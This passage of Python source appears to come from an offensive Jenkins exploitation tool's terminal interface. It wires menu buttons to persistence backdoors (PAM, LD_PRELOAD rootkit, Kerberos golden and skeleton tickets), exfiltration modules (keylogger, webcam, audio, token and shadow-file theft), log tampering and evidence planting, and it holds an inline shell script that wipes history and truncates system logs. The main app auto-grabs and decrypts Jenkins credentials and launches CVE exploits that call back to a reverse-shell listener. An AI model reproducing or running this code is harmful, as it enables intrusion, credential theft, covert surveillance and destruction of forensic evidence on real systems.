            from jenkins_breaker.ui.ops_scripts.persist import SSHKeyInject
            self.ops_runner.run_python_script(SSHKeyInject)

        elif btn_id == "per-systemd":
            from jenkins_breaker.ui.ops_scripts.persist import SystemdService
            self.ops_runner.run_python_script(SystemdService)

        elif btn_id == "per-ld-preload":
            from jenkins_breaker.ui.ops_scripts.persist import LDPreloadRootkit
            self.ops_runner.run_python_script(LDPreloadRootkit)

        elif btn_id == "per-pam":
            from jenkins_breaker.ui.ops_scripts.persist import PAMBackdoor
            self.ops_runner.run_python_script(PAMBackdoor)

        elif btn_id == "per-bashrc":
            from jenkins_breaker.ui.ops_scripts.persist import BashrcInjection
            self.ops_runner.run_python_script(BashrcInjection)

        elif btn_id == "per-startup":
            from jenkins_breaker.ui.ops_scripts.persist import StartupScripts
            self.ops_runner.run_python_script(StartupScripts)

        elif btn_id == "per-registry":
            from jenkins_breaker.ui.ops_scripts.persist import RegistryRunKeys
            self.ops_runner.run_python_script(RegistryRunKeys)

        elif btn_id == "per-wmi":
            from jenkins_breaker.ui.ops_scripts.persist import WMISubscription
            self.ops_runner.run_python_script(WMISubscription)

        elif btn_id == "per-schtask":
            from jenkins_breaker.ui.ops_scripts.persist import ScheduledTaskPersist
            self.ops_runner.run_python_script(ScheduledTaskPersist)

        elif btn_id == "per-golden":
            from jenkins_breaker.ui.ops_scripts.persist import GoldenTicket
            self.ops_runner.run_python_script(GoldenTicket)

        elif btn_id == "per-silver":
            from jenkins_breaker.ui.ops_scripts.persist import SilverTicket
            self.ops_runner.run_python_script(SilverTicket)

        elif btn_id == "per-skeleton":
            from jenkins_breaker.ui.ops_scripts.persist import SkeletonKey
            self.ops_runner.run_python_script(SkeletonKey)

        elif btn_id == "per-jenkins":
            from jenkins_breaker.ui.ops_scripts.persist import JenkinsPipelineBackdoor
            self.ops_runner.run_python_script(JenkinsPipelineBackdoor)

        elif btn_id == "per-git":
            from jenkins_breaker.ui.ops_scripts.persist import GitHookBackdoor
            self.ops_runner.run_python_script(GitHookBackdoor)

        elif btn_id == "per-docker":
            from jenkins_breaker.ui.ops_scripts.persist import DockerContainerPersist
            self.ops_runner.run_python_script(DockerContainerPersist)

        elif btn_id == "per-k8s":
            from jenkins_breaker.ui.ops_scripts.persist import K8sAdmissionWebhook
            self.ops_runner.run_python_script(K8sAdmissionWebhook)

        elif btn_id == "per-lambda":
            from jenkins_breaker.ui.ops_scripts.persist import LambdaBackdoor
            self.ops_runner.run_python_script(LambdaBackdoor)

        elif btn_id == "per-gcf":
            from jenkins_breaker.ui.ops_scripts.persist import CloudFunctionPersist
            self.ops_runner.run_python_script(CloudFunctionPersist)

        elif btn_id == "sit-edr-detect":
            from jenkins_breaker.ui.ops_scripts.situational import EDRDetection
            self.ops_runner.run_python_script(EDRDetection)

        elif btn_id == "sit-firewall":
            from jenkins_breaker.ui.ops_scripts.situational import FirewallEnum
            self.ops_runner.run_python_script(FirewallEnum)

        elif btn_id == "sit-selinux":
            from jenkins_breaker.ui.ops_scripts.situational import SELinuxAppArmor
            self.ops_runner.run_python_script(SELinuxAppArmor)

        elif btn_id == "sit-monitoring":
            from jenkins_breaker.ui.ops_scripts.situational import MonitoringDetection
            self.ops_runner.run_python_script(MonitoringDetection)

        elif btn_id == "sit-connections":
            from jenkins_breaker.ui.ops_scripts.situational import ActiveConnections
            self.ops_runner.run_python_script(ActiveConnections)

        elif btn_id == "sit-users":
            from jenkins_breaker.ui.ops_scripts.situational import LoggedUsers
            self.ops_runner.run_python_script(LoggedUsers)

        elif btn_id == "sit-context":
            from jenkins_breaker.ui.ops_scripts.situational import EnvironmentContext
            self.ops_runner.run_python_script(EnvironmentContext)

        elif btn_id == "sit-netif":
            from jenkins_breaker.ui.ops_scripts.situational import NetworkInterfaces
            self.ops_runner.run_python_script(NetworkInterfaces)

        elif btn_id == "sit-routes":
            from jenkins_breaker.ui.ops_scripts.situational import RoutingTables
            self.ops_runner.run_python_script(RoutingTables)

        elif btn_id == "sit-dns":
            from jenkins_breaker.ui.ops_scripts.situational import DNSServers
            self.ops_runner.run_python_script(DNSServers)

        elif btn_id == "sit-proxy":
            from jenkins_breaker.ui.ops_scripts.situational import ProxyDetection
            self.ops_runner.run_python_script(ProxyDetection)

        elif btn_id == "sit-ntp":
            from jenkins_breaker.ui.ops_scripts.situational import NTPServers
            self.ops_runner.run_python_script(NTPServers)

        elif btn_id == "sit-syslog":
            from jenkins_breaker.ui.ops_scripts.situational import SyslogDestination
            self.ops_runner.run_python_script(SyslogDestination)

        elif btn_id == "sit-siem":
            from jenkins_breaker.ui.ops_scripts.situational import SIEMDetection
            self.ops_runner.run_python_script(SIEMDetection)

        elif btn_id == "sit-container":
            from jenkins_breaker.ui.ops_scripts.situational import ContainerRuntime
            self.ops_runner.run_python_script(ContainerRuntime)

        elif btn_id == "sit-orchestrator":
            from jenkins_breaker.ui.ops_scripts.situational import OrchestratorDetection
            self.ops_runner.run_python_script(OrchestratorDetection)

        elif btn_id == "sit-cloud":
            from jenkins_breaker.ui.ops_scripts.situational import CloudProviderDetect
            self.ops_runner.run_python_script(CloudProviderDetect)

        elif btn_id == "sit-backup":
            from jenkins_breaker.ui.ops_scripts.situational import BackupSoftware
            self.ops_runner.run_python_script(BackupSoftware)

        elif btn_id == "sit-av-excl":
            from jenkins_breaker.ui.ops_scripts.situational import AVExclusions
            self.ops_runner.run_python_script(AVExclusions)

        elif btn_id == "sit-appwhite":
            from jenkins_breaker.ui.ops_scripts.situational import AppWhitelisting
            self.ops_runner.run_python_script(AppWhitelisting)

        elif btn_id == "exf-mem-dump":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import MemoryDump
            self.ops_runner.run_python_script(MemoryDump)

        elif btn_id == "exf-tokens":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import TokenStealer
            self.ops_runner.run_python_script(TokenStealer)

        elif btn_id == "exf-certificates":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import CertificateHarvest
            self.ops_runner.run_python_script(CertificateHarvest)

        elif btn_id == "exf-shadow":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import ShadowExtract
            self.ops_runner.run_python_script(ShadowExtract)

        elif btn_id == "exf-full-dump":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import FullCredDump
            self.ops_runner.run_python_script(FullCredDump)

        elif btn_id == "exf-browser-hist":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import BrowserHistory
            self.ops_runner.run_python_script(BrowserHistory)

        elif btn_id == "exf-clipboard":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import ClipboardMonitor
            self.ops_runner.run_python_script(ClipboardMonitor)

        elif btn_id == "exf-keylog":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import Keylogger
            self.ops_runner.run_python_script(Keylogger)

        elif btn_id == "exf-screenshot":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import ScreenshotCapture
            self.ops_runner.run_python_script(ScreenshotCapture)

        elif btn_id == "exf-webcam":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import WebcamCapture
            self.ops_runner.run_python_script(WebcamCapture)

        elif btn_id == "exf-audio":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import AudioRecording
            self.ops_runner.run_python_script(AudioRecording)

        elif btn_id == "exf-filesearch":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import FileSearch
            self.ops_runner.run_python_script(FileSearch)

        elif btn_id == "exf-dbdump":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import DatabaseDump
            self.ops_runner.run_python_script(DatabaseDump)

        elif btn_id == "exf-source":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import SourceCodeExfil
            self.ops_runner.run_python_script(SourceCodeExfil)

        elif btn_id == "exf-email":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import EmailArchive
            self.ops_runner.run_python_script(EmailArchive)

        elif btn_id == "exf-chat":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import ChatHistory
            self.ops_runner.run_python_script(ChatHistory)

        elif btn_id == "exf-s3":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import S3BucketEnum
            self.ops_runner.run_python_script(S3BucketEnum)

        elif btn_id == "exf-gcp-storage":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import GCPStorage
            self.ops_runner.run_python_script(GCPStorage)

        elif btn_id == "exf-azure-blob":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import AzureBlob
            self.ops_runner.run_python_script(AzureBlob)

        elif btn_id == "exf-secrets":
            from jenkins_breaker.ui.ops_scripts.exfiltrate import SecretsManagerDump
            self.ops_runner.run_python_script(SecretsManagerDump)

        elif btn_id == "util-stabilize":
            self._stabilize_shell()

        elif btn_id == "util-clear-tracks":
            script = """
echo "[*] CLEARING ALL TRACKS"
echo "======================"
history -c
unset HISTFILE
echo "" > ~/.bash_history
echo "" > /var/log/auth.log 2>/dev/null
echo "" > /var/log/syslog 2>/dev/null
find /var/log -name "*.log" -exec truncate -s 0 {} \\; 2>/dev/null
echo "[+] Tracks cleared"
"""
            self.ops_runner.run_script(script, "clear_tracks.sh")

        elif btn_id == "util-upload":
            script_path = self.query_one("#util-script-path", Input).value
            if script_path and Path(script_path).exists():
                output.write(f"[cyan]Uploading {script_path}...[/cyan]\n")
                self._upload_file_b64(script_path, f"/tmp/{Path(script_path).name}")
            else:
                output.write("[red]File not found[/red]\n")
                output.write("[yellow]Provide absolute path to your custom script[/yellow]\n")
                output.write("[dim]Example: C:\\\\scripts\\\\my_enum.sh or /home/user/scripts/recon.sh[/dim]\n")

        elif btn_id == "util-port-forward":
            from jenkins_breaker.ui.ops_scripts.utility import PortForward
            self.ops_runner.run_python_script(PortForward)

        elif btn_id == "util-socks":
            from jenkins_breaker.ui.ops_scripts.utility import SOCKSProxy
            self.ops_runner.run_python_script(SOCKSProxy)

        elif btn_id == "util-chisel":
            from jenkins_breaker.ui.ops_scripts.utility import ChiselTunnel
            self.ops_runner.run_python_script(ChiselTunnel)

        elif btn_id == "util-ssh-tunnel":
            from jenkins_breaker.ui.ops_scripts.utility import SSHTunnel
            self.ops_runner.run_python_script(SSHTunnel)

        elif btn_id == "util-reverse-ssh":
            from jenkins_breaker.ui.ops_scripts.utility import ReverseSSH
            self.ops_runner.run_python_script(ReverseSSH)

        elif btn_id == "util-file-xfer":
            from jenkins_breaker.ui.ops_scripts.utility import FileTransfer
            self.ops_runner.run_python_script(FileTransfer)

        elif btn_id == "util-pcap":
            from jenkins_breaker.ui.ops_scripts.utility import PacketCapture
            self.ops_runner.run_python_script(PacketCapture)

        elif btn_id == "util-intercept":
            from jenkins_breaker.ui.ops_scripts.utility import TrafficIntercept
            self.ops_runner.run_python_script(TrafficIntercept)

        elif btn_id == "util-inject":
            from jenkins_breaker.ui.ops_scripts.utility import ProcessInjection
            self.ops_runner.run_python_script(ProcessInjection)

        elif btn_id == "util-persist-menu":
            from jenkins_breaker.ui.ops_scripts.utility import PersistenceMenu
            self.ops_runner.run_python_script(PersistenceMenu)

        elif btn_id == "util-cleanup":
            from jenkins_breaker.ui.ops_scripts.utility import CleanupTool
            self.ops_runner.run_python_script(CleanupTool)

        elif btn_id == "util-antiforensics":
            from jenkins_breaker.ui.ops_scripts.utility import AntiForensics
            self.ops_runner.run_python_script(AntiForensics)

        elif btn_id == "util-logtamper":
            from jenkins_breaker.ui.ops_scripts.utility import LogTamper
            self.ops_runner.run_python_script(LogTamper)

        elif btn_id == "util-timestamp":
            from jenkins_breaker.ui.ops_scripts.utility import TimestampManip
            self.ops_runner.run_python_script(TimestampManip)

        elif btn_id == "util-evidence":
            from jenkins_breaker.ui.ops_scripts.utility import EvidencePlant
            self.ops_runner.run_python_script(EvidencePlant)

        elif btn_id == "util-report":
            from jenkins_breaker.ui.ops_scripts.utility import ReportGenerator
            self.ops_runner.run_python_script(ReportGenerator)

        elif btn_id == "util-screenshot-loop":
            from jenkins_breaker.ui.ops_scripts.utility import ScreenshotLoop
            self.ops_runner.run_python_script(ScreenshotLoop)

        elif btn_id == "background-btn":
            output.write("\n[yellow]>>> Backgrounding session (keeping connection alive)...[/yellow]\n")
            self.running = False
            if self.recv_thread and self.recv_thread.is_alive():
                self.recv_thread.join(timeout=2)
            session_manager.background_current_session()
            output.write(f"[green]>>> Session {self.session_id} backgrounded successfully[/green]\n")
            self.dismiss()

        elif btn_id == "copy-output-btn":
            try:
                import pyperclip
                # Get last 100 lines of output from transcript
                if self.transcript_path.exists():
                    lines = self.transcript_path.read_text().split('\n')
                    last_output = '\n'.join(lines[-100:])
                    pyperclip.copy(last_output)
                    output.write("[green]>>> Last 100 lines copied to clipboard![/green]\n")
                else:
                    output.write("[yellow]>>> No transcript available yet[/yellow]\n")
            except ImportError:
                output.write("[yellow]>>> pyperclip not installed - showing transcript file location[/yellow]\n")
                output.write(f"[dim]File: {self.transcript_path}[/dim]\n")
            except Exception as e:
                output.write(f"[red]>>> Copy failed: {e}[/red]\n")

        elif btn_id == "save-transcript-btn":
            output.write(f"\n[green]Transcript saved: {self.transcript_path}[/green]\n")
            loot_manager.add_artifact(
                name=f"session_{self.session_id}_transcript",
                content=self.transcript_path.read_text(encoding='utf-8', errors='ignore'),
                artifact_type="transcript",
                source=f"Session {self.session_id}"
            )

        elif btn_id == "kill-btn":
            self.running = False
            session_manager.mark_session_dead(self.session_id)
            self.dismiss()
            return  # Don't refocus when closing

        # Return focus to input after any button press
        try:
            self.query_one("#shell-command-input", Input).focus()
        except:
            pass

    def on_unmount(self) -> None:
        self.running = False

        if self.transcript_file:
            self._log_transcript(f"\n=== Session Backgrounded: {datetime.now().isoformat()} ===\n")
            try:
                self.transcript_file.close()
            except:
                pass

        if self.recv_thread and self.recv_thread.is_alive():
            self.recv_thread.join(timeout=2)


class JenkinsBreakerTUI(App):
    """Textual TUI for JenkinsBreaker"""

    CSS = """
    Screen {
        background: $surface;
    }

    StatusBar {
        dock: top;
        height: 1;
        background: $primary;
        color: $text;
        padding: 0 1;
    }

    #main-container {
        height: 100%;
    }

    #target-panel {
        height: 15;
        border: solid $accent;
        margin: 1;
    }

    #control-panel {
        height: 14;
        border: solid $accent;
        margin: 1;
    }

    #sessions-panel {
        height: 10;
        width: 50%;
        border: solid $accent;
        margin: 1;
        overflow-y: auto;
    }

    #loot-panel {
        height: 10;
        width: 50%;
        border: solid $accent;
        margin: 1;
        overflow-y: auto;
    }

    #cve-table {
        height: 20;
        border: solid $accent;
        margin: 1;
        overflow-y: auto;
    }

    #exploit-log {
        height: 1fr;
        border: solid $accent;
        margin: 1;
    }

    #fuzzer-panel {
        height: 15;
        border: solid $accent;
        margin: 1;
    }

    #http-traffic {
        height: 15;
        border: solid $accent;
        margin: 1;
    }

    #cve-info-panel {
        height: 12;
        border: solid $accent;
        margin: 1;
        padding: 1;
    }

    Input {
        margin: 1;
    }

    Button {
        margin: 1;
    }
    """

    BINDINGS = [
        Binding("q", "quit", "Quit"),
        Binding("e", "enumerate", "Enumerate"),
        Binding("x", "exploit", "Exploit"),
        Binding("c", "connect", "Connect"),
        Binding("r", "reset", "Reset"),
        Binding("s", "refresh_sessions", "Sessions"),
        Binding("enter", "interact_session", "Interact"),
        Binding("l", "refresh_loot", "Loot"),
        Binding("f", "start_fuzzer", "Fuzzer"),
        Binding("i", "show_cve_info", "CVE Info"),
        Binding("v", "toggle_verbose", "Verbose"),
        Binding("j", "cursor_down", "Down"),
        Binding("k", "cursor_up", "Up"),
        Binding("/", "search_filter", "Search"),
        Binding("ctrl+p", "command_palette", "Palette"),
        Binding("t", "show_timeline", "Timeline"),
        Binding("w", "save_workspace", "Save"),
        Binding("p", "customize_payload", "Payload"),
        Binding("o", "toggle_opsec", "OPSEC"),
        Binding("h", "execute_chain", "Chain"),
        Binding("g", "grab_credentials", "Grab Creds"),
        Binding("ctrl+g", "generate_report", "Report"),
        Binding("ctrl+l", "start_listener", "Start Listener"),
        Binding("d", "grab_decrypt_files", "Decrypt Files"),
        Binding("m", "test_crumb", "CSRF Test"),
        Binding("v", "open_crumb_vault", "Crumb Vault"),
        Binding("z", "toggle_ghost_mode", "Ghost Mode"),
        Binding("b", "create_backdoor", "Golden Ticket"),
    ]

    def __init__(self):
        super().__init__()
        self.session: Optional[JenkinsSession] = None
        self.active_listener: Optional[ReverseShellListener] = None
        self.listener_thread: Optional[threading.Thread] = None
        self.fuzzer: Optional[JenkinsFuzzer] = None
        self.verbose_mode = False
        self.show_http_traffic = False
        self.show_fuzzer_panel = False
        self.show_cve_info = False
        self.cve_filter = ""
        self.current_workspace = None
        self.payload_config = {"target_os": "linux", "encoding": "none", "obfuscation": "moderate"}
        self.opsec_enabled = True
        self.obfuscator = GroovyObfuscator()
        self.chain_engine = None
        self.ghost_mode_enabled = False
        self.refresh_timer = None

    def _detect_external_ip(self) -> str:
        """Detect external IP address for payload generation"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "192.168.1.1"

    def _get_payload_ip(self, lhost: str) -> str:
        """Get IP for payload - auto-detect if 0.0.0.0"""
        if lhost == "0.0.0.0" or not lhost:
            return self._detect_external_ip()
        return lhost

    def on_mount(self) -> None:
        """Initialize auto-refresh timer for multi-handler session monitoring"""
        session_manager.start_cleanup_monitor()
        self.set_interval(2.0, self._auto_refresh_sessions)

    def _auto_refresh_sessions(self):
        """Auto-refresh sessions panel and status bar"""
        try:
            sessions_panel = self.query_one(SessionsPanel)
            sessions_panel.refresh_sessions()

            status_bar = self.query_one(StatusBar)
            status_bar.refresh()
        except:
            pass

    def compose(self) -> ComposeResult:
        yield Header()
        yield StatusBar()

        with Vertical(id="main-container"):
            with Horizontal(id="target-panel"):
                yield TargetInfo()
                yield CrumbStatus()

            with Container(id="control-panel"):
                with Horizontal():
                    with Vertical():
                        yield Label("Jenkins URL:")
                        yield Input(placeholder="http://jenkins.example.com:8080", id="url-input", value="http://localhost:8080")
                        yield Label("Username:")
                        yield Input(placeholder="admin", id="username-input", value="admin")
                        yield Label("Password:")
                        yield Input(placeholder="password", password=True, id="password-input", value="admin")

                    with Vertical():
                        yield Label("Reverse Shell Listener (LHOST):")
                        yield Label("[dim]0.0.0.0 = listen on ALL interfaces (recommended)[/dim]")
                        yield Input(placeholder="0.0.0.0", id="lhost-input", value="0.0.0.0")
                        yield Label("Listener Port (LPORT):")
                        yield Input(placeholder="4444", id="lport-input", value="4444")
                        yield Label("Handler (auto/nc/python):")
                        yield Input(placeholder="auto", id="handler-input", value="auto")

                with Horizontal():
                    yield Button("Connect", id="connect-btn", variant="primary")
                    yield Button("Enumerate", id="enumerate-btn", variant="success")
                    yield Button("Auto Exploit All", id="exploit-btn", variant="warning")
                    yield Button("Reset", id="reset-btn", variant="error")

            with Horizontal():
                with Container(id="sessions-panel"):
                    yield Label("[bold cyan]Sessions[/bold cyan] [dim](Press 's')[/dim]")
                    yield SessionsPanel()

                with Container(id="loot-panel"):
                    yield Label("[bold cyan]Loot[/bold cyan] [dim](Press 'l')[/dim]")
                    yield LootPanel()

            with Container(id="cve-table"):
                yield Label("[bold cyan]Available Exploits[/bold cyan] [dim](Click row | 'i'=info | '/'=filter | 'p'=payload | 'o'=opsec | 'h'=chain)[/dim]")
                yield CVETable()

            with Container(id="exploit-log"):
                yield ExploitLog()

        yield Footer()

    def on_mount(self) -> None:
        self.title = "JenkinsBreaker TUI"
        log = self.query_one(ExploitLog)
        log.log_header("JenkinsBreaker TUI")
        log.log_info("Press 'c' to connect or click Connect button")
        self.update_listener_status()
        session_manager.start_cleanup_monitor()
        self.set_interval(2.0, self.auto_refresh_panels)

    def update_listener_status(self) -> None:
        """Update the listener configuration in status bar"""
        lhost_input = self.query_one("#lhost-input", Input)
        lport_input = self.query_one("#lport-input", Input)

        lhost = lhost_input.value or "0.0.0.0"
        lport = lport_input.value or "4444"

        status_bar = self.query_one(StatusBar)
        status_bar.listener_config = f"[cyan]{lhost}:{lport}[/cyan]"

    def action_quit(self) -> None:
        if self.active_listener:
            self.active_listener.stop()
        if self.session:
            self.session.close()
        self.exit()

    def action_reset(self) -> None:
        log = self.query_one(ExploitLog)
        log.clear()
        log.log_header("Session Reset")
        if self.session:
            self.session.close()
            self.session = None

        status_bar = self.query_one(StatusBar)
        status_bar.connection_status = "[red]Disconnected[/red]"

    async def action_connect(self) -> None:
        url_input = self.query_one("#url-input", Input)
        username_input = self.query_one("#username-input", Input)
        password_input = self.query_one("#password-input", Input)

        url = url_input.value
        username = username_input.value or None
        password = password_input.value or None

        log = self.query_one(ExploitLog)
        status_bar = self.query_one(StatusBar)

        try:
            config = SessionConfig(
                url=url,
                username=username,
                password=password,
                timeout=10,
                verify_ssl=False
            )

            self.session = JenkinsSession(config)

            if self.session.connect():
                version = self.session.version or "Unknown"

                target_info = self.query_one(TargetInfo)
                target_info.set_target(url, version)

                status_bar.connection_status = f"[green]Connected[/green] - Jenkins {version}"
                log.log_success(f"Connected to Jenkins {version} as {username or 'anonymous'}")

                crumb_status = self.query_one(CrumbStatus)
                if self.session.crumb_manager:
                    if self.session.crumb_manager.csrf_disabled:
                        crumb_status.set_crumb_data(
                            crumb_value="",
                            status="Disabled",
                            vulnerabilities={"csrf_disabled": True}
                        )
                        log.log_warning("\n⚠ VULNERABILITY: CSRF Protection Disabled (CWE-352)")
                        log.log_info("  All POST endpoints exploitable without tokens")
                    elif self.session.crumb_manager.crumb:
                        crumb_status.set_crumb_data(
                            crumb_value=self.session.crumb_manager.crumb.value,
                            status="Verified",
                            vulnerabilities={}
                        )
                    else:
                        crumb_status.set_crumb_data(status="Missing")
                else:
                    crumb_status.set_crumb_data(status="Missing")

                if self.session.is_authenticated:
                    log.log_info("\nAuto-grabbing credential files...")
                    try:
                        from jenkins_breaker.postex.auto_loot import auto_grab_jenkins_credentials

                        cred_result = auto_grab_jenkins_credentials(self.session, loot_manager)

                        if cred_result.get('files_grabbed', 0) > 0:
                            log.log_success(f"✓ Grabbed {cred_result['files_grabbed']} credential files")
                            
                            files = cred_result.get('files', {})
                            for filename in files.keys():
                                log.log_success(f"  ✓ {filename}")
                            
                            if cred_result.get('secrets_found', 0) > 0:
                                log.log_success(f"✓ Decrypted {cred_result['secrets_found']} secrets")
                                log.log_info("  Saved to loot/credentials.json")
                            else:
                                log.log_info("  No secrets in credentials.xml (empty or no credentials configured)")
                            log.log_info("  Press 'l' to view loot")
                        else:
                            log.log_warning("Could not auto-grab credential files (try 'g' to retry manually)")
                    except Exception as grab_error:
                        log.log_warning(f"Credential auto-grab failed: {str(grab_error)}")
            else:
                status_bar.connection_status = "[red]Connection failed[/red]"
                log.log_error("Connection failed")

        except Exception as e:
            status_bar.connection_status = "[red]Connection error[/red]"
            log.log_error(f"Connection error: {str(e)}")

    async def action_enumerate(self) -> None:
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        log.write("\n")
        log.log_header("Enumeration Results")

        try:
            enumerator = JenkinsEnumerator(
                base_url=self.session.base_url,
                auth=self.session.auth,
                proxies={},
                verify_ssl=False,
                timeout=10,
                delay=0.0
            )

            log.log_info("Running version-based enumeration...")
            result = enumerator.enumerate_all(
                session=self.session,
                test_actual_vulns=True,
                auto_grab_credentials=True,
                loot_manager=loot_manager
            )

            if result.version:
                log.log_success(f"Version: {result.version.version}")

            if result.plugins:
                log.log_success(f"Found {len(result.plugins)} plugins")
                active_count = sum(1 for p in result.plugins if p.active)
                log.write(f"  ({active_count} active, {len(result.plugins) - active_count} inactive)\n")

            if result.jobs:
                log.log_success(f"Found {len(result.jobs)} jobs")

            if result.vulnerabilities:
                confirmed_vulns = [v for v in result.vulnerabilities if v.get('status') == 'confirmed']
                potential_vulns = [v for v in result.vulnerabilities if v.get('status') == 'potential']

                if confirmed_vulns:
                    log.log_success(f"\n{len(confirmed_vulns)} CONFIRMED vulnerabilities (tested):")
                    for vuln in confirmed_vulns[:10]:
                        cve = vuln.get('cve', 'N/A')
                        desc = vuln.get('description', 'N/A')
                        log.write(f"  [green]✓[/green] {cve}: {desc}\n")

                if potential_vulns:
                    log.log_warning(f"\n{len(potential_vulns)} potential vulnerabilities (version-based):")
                    for vuln in potential_vulns[:5]:
                        cve = vuln.get('cve', 'N/A')
                        desc = vuln.get('description', 'N/A')
                        log.write(f"  [yellow]?[/yellow] {cve}: {desc}\n")

            if result.credentials and result.credentials.get('files_grabbed', 0) > 0:
                log.log_success(f"\n[bold green]Auto-grabbed {result.credentials['files_grabbed']} credential files:[/bold green]")
                
                files = result.credentials.get('files', {})
                for filename in files.keys():
                    log.log_success(f"  ✓ {filename}")
                
                if result.credentials.get('can_decrypt'):
                    secrets_count = result.credentials['secrets_found']
                    log.log_success(f"\n  [bold green]✓ Decrypted {secrets_count} secrets successfully[/bold green]")
                    log.log_info("  Decrypted credentials saved to loot/credentials.json")
                    log.log_info("  Press 'l' to view all loot in detail")
                    
                    if secrets_count > 0:
                        log.log_info(f"\n  Preview of decrypted secrets:")
                        log.write(f"    Found {secrets_count} decrypted values (passwords, API tokens, SSH keys)\n")
                else:
                    log.log_warning(f"\n  Partial files grabbed: {', '.join(files.keys())}")
                    log.log_warning("  Cannot decrypt - missing required files")
                    log.log_info("  Need both master.key and hudson.util.Secret for decryption")

        except Exception as e:
            log.log_error(f"Enumeration failed: {str(e)}")

    async def run_single_exploit(self, cve_id: str) -> None:
        """Run a single exploit by CVE ID"""
        log = self.query_one(ExploitLog)

        if not self.session:
            log.log_error("Not connected - Press 'c' to connect first")
            return

        lhost_input = self.query_one("#lhost-input", Input)
        lport_input = self.query_one("#lport-input", Input)
        handler_input = self.query_one("#handler-input", Input)

        lhost_bind = lhost_input.value or "0.0.0.0"
        lhost = self._get_payload_ip(lhost_bind)
        lport = int(lport_input.value) if lport_input.value else 4444
        handler = handler_input.value or "auto"

        if not self.active_listener or not self.listener_thread or not self.listener_thread.is_alive():
            log.log_warning("No listener running - starting automatically...")
            await self.action_start_listener()
            await asyncio.sleep(3)

        listener_ready = await asyncio.to_thread(self.verify_listener, lhost_bind, lport)
        if not listener_ready:
            log.log_error(f"Listener not ready on {lhost_bind}:{lport} after 3s - retrying...")
            await asyncio.sleep(2)
            listener_ready = await asyncio.to_thread(self.verify_listener, lhost_bind, lport)
            if not listener_ready:
                log.log_error(f"Listener failed to start on {lhost_bind}:{lport} - check firewall/permissions")
                return

        log.log_success(f"Listener verified on {lhost}:{lport}")

        log.write("\n")
        log.log_header(f"Running {cve_id}")
        log.write(f"Payload: {lhost}:{lport} ({handler})\n")
        if lhost_bind == "0.0.0.0":
            log.log_info(f"Auto-detected payload IP: {lhost}")

        try:
            exploit_module = exploit_registry.get(cve_id)
            metadata = exploit_registry.list_all()[cve_id]

            if metadata.requires_auth and not self.session.is_authenticated:
                log.log_warning("Exploit requires authentication - connect first")
                return

            log.log_info("Checking vulnerability...")
            is_vulnerable = await asyncio.to_thread(exploit_module.check_vulnerable, self.session)

            if is_vulnerable:
                log.log_success("Target appears vulnerable")

                options = {
                    'lhost': lhost,
                    'lport': lport,
                    'handler': handler,
                    'target_os': self.payload_config['target_os'],
                    'encoding': self.payload_config['encoding'],
                    'wait_for_completion': False,
                    'rollback': False
                }

                log.log_info("Executing exploit...")
                
                from jenkins_breaker.post.session_manager import session_manager
                sessions_before = len(session_manager.list_active_sessions())
                
                result = await asyncio.to_thread(exploit_module.run, self.session, **options)

                if result.status == "success":
                    log.log_success(f"{cve_id}: SUCCESS - {result.details}")

                    if result.data:
                        if 'credentials' in result.data:
                            log.log_success(f"  Captured {len(result.data['credentials'])} credentials")
                        if 'artifacts' in result.data:
                            log.log_success(f"  Captured {len(result.data['artifacts'])} artifacts")
                    
                    log.log_info("Waiting for shell connection (checking for 10 seconds)...")
                    for i in range(20):
                        await asyncio.sleep(0.5)
                        sessions_after = len(session_manager.list_active_sessions())
                        if sessions_after > sessions_before:
                            log.log_success(f"✓ Shell connected! ({sessions_after - sessions_before} new session(s))")
                            log.log_info("Press 's' to interact with session")
                            self.query_one(SessionsPanel).refresh_sessions()
                            break
                    else:
                        log.log_warning(f"No shell received after 10 seconds (sessions: {sessions_before} → {sessions_after})")
                        log.log_info("Shell may still connect - check Sessions panel ('s')")
                        
                elif result.status == "failure":
                    log.log_error(f"{cve_id}: Failed - {result.details}")
                    if result.error:
                        log.log_error(f"  Error detail: {result.error}")
                else:
                    log.log_warning(f"{cve_id}: {result.status} - {result.details}")
            else:
                log.log_info(f"{cve_id}: Not vulnerable")

        except Exception as e:
            import traceback
            log.log_error(f"{cve_id}: Error - {str(e)}")
            log.log_error(f"  Traceback: {traceback.format_exc()[:200]}")

    def verify_listener(self, lhost: str, lport: int) -> bool:
        """Verify if listener is active on specified port without connecting to it"""
        import subprocess

        try:
            if sys.platform == "win32":
                result = subprocess.run(
                    ["netstat", "-an"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )

                for line in result.stdout.split('\n'):
                    if f":{lport}" in line and "LISTENING" in line:
                        return True
                return False
            else:
                result = subprocess.run(
                    ["ss", "-ltn"],
                    capture_output=True,
                    text=True,
                    timeout=5
                )

                for line in result.stdout.split('\n'):
                    if f":{lport}" in line and "LISTEN" in line:
                        return True
                return False
        except:
            return False

    async def action_start_listener(self):
        """Start background reverse shell listener"""
        log = self.query_one(ExploitLog)

        if self.active_listener and self.listener_thread and self.listener_thread.is_alive():
            log.log_warning("Listener already running")
            return

        # Clean up stale listener state if thread died
        if self.active_listener and (not self.listener_thread or not self.listener_thread.is_alive()):
            log.log_info("Cleaning up dead listener...")
            self.active_listener = None
            self.listener_thread = None

        lhost_input = self.query_one("#lhost-input", Input)
        lport_input = self.query_one("#lport-input", Input)
